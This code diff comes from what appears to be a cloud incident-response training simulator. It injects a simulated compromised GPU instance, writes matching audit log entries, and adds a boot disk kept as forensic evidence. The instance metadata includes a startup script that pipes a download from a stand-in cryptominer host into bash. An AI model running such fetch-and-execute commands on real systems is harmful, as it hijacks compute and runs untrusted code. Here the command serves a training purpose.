@@ -320,6 +320,8 @@ func ApplyFault(st *sim.State, project string, l *Lab, f Fault) error {
 			return ""
 		}(), InternalIP: ip, ExternalIP: st.ExternalIP(), ServiceAccount: sa, Scopes: []string{"cloud-platform"}, Image: "ubuntu-2204-lts", GPUs: fi(f, "gpus", 4),
 			Labels: map[string]string{"sim-cpu": "high"}, Metadata: map[string]string{"startup-script": "curl -s http://pool.minexmr.example/x.sh | bash"}, CreatedBy: "serviceAccount:" + sa}
+		// boot disk: forensic evidence that disappears with the instance unless snapshotted
+		p.Disks[name] = &sim.Disk{Name: name, Zone: zone, SizeGB: 100, Type: "pd-balanced", Image: "ubuntu-2204-lts", Users: []string{name}}
 		st.Audit(project, "serviceAccount:"+sa, "compute.googleapis.com", "v1.compute.instances.insert", "projects/"+project+"/zones/"+zone+"/instances/"+name)
 		st.Log(project, sim.LogEntry{Severity: "NOTICE", LogName: "cloudaudit.googleapis.com%2Factivity", Resource: sim.LogResource{Type: "gce_instance"},
 			Proto: map[string]string{"methodName": "v1.compute.instances.insert", "authenticationInfo.principalEmail": sa, "requestMetadata.callerIp": "185.220.101.7", "resourceName": "projects/" + project + "/zones/" + zone + "/instances/" + name}})
